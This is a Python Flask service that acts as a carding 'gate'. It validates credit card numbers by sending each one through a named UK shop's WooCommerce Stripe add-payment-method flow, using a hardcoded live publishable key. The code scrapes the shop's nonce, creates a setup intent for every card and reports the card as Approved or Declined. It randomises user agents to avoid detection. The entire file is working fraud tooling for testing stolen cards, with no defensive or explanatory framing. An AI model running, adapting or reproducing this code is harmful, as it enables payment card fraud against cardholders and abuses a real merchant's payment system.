from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent
import re

app = Flask(__name__)

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "cc": ccx,
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    
    # Step 1: Create Payment Method
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/e15cb9c2d4; stripe-js-v3/e15cb9c2d4',
        'referrer': 'https://quiltedbear.co.uk',
        'key': 'pk_live_90o1zSEv0cxulJp2q9wFbksO',
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={'User-Agent': user_agent}
        )
        pm_data = pm_response.json()
        
        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {
                "cc": ccx,
                "response": error_msg,
                "status": "Declined"
            }
            
        payment_method_id = pm_data['id']
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Payment Method Creation Failed",
            "status": "Declined"
        }

    # Step 2: Get Nonce
    headers = {
        'User-Agent': user_agent,
        'Referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
    }
    
    try:
        nonce_response = requests.get(
            'https://quiltedbear.co.uk/my-account/add-payment-method/',
            headers=headers
        )
        
        # Extract nonce from response
        nonce = None
        if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
            nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        else:
            return {
                "cc": ccx,
                "response": "Failed to extract nonce",
                "status": "Declined"
            }
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Nonce Retrieval Failed",
            "status": "Declined"
        }

    # Step 3: Create Setup Intent
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    try:
        setup_response = requests.post(
            'https://quiltedbear.co.uk/',
            params=params,
            headers=headers,
            data=data
        )
        setup_data = setup_response.json()
        
        if setup_data.get('success', False):
            if 'data' in setup_data:
                if setup_data['data'].get('status') == 'requires_action':
                    return {
                        "cc": ccx,
                        "response": "requires_action",
                        "status": "Approved"
                    }
                elif setup_data['data'].get('status') == 'succeeded':
                    return {
                        "cc": ccx,
                        "response": "Succeeded",
                        "status": "Approved"
                    }
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {
                        "cc": ccx,
                        "response": error_msg,
                        "status": "Declined"
                    }
        
        # Handle specific error cases
        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
            return {
                "cc": ccx,
                "response": error_msg,
                "status": "Declined"
            }
        
        return {
            "cc": ccx,
            "response": str(setup_data),
            "status": "Declined"
        }
            
    except Exception as e:
        return {
            "cc": ccx,
            "response": "Setup Intent Failed",
            "status": "Declined"
        }

@app.route('/gate=stripe4/keydarkwaslost/cc=<path:cc>')
def check_card(cc):
    # Validate CC format
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({
            "cc": cc,
            "response": "Invalid card format",
            "status": "Error"
        }), 400
    
    result = process_card(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7890)
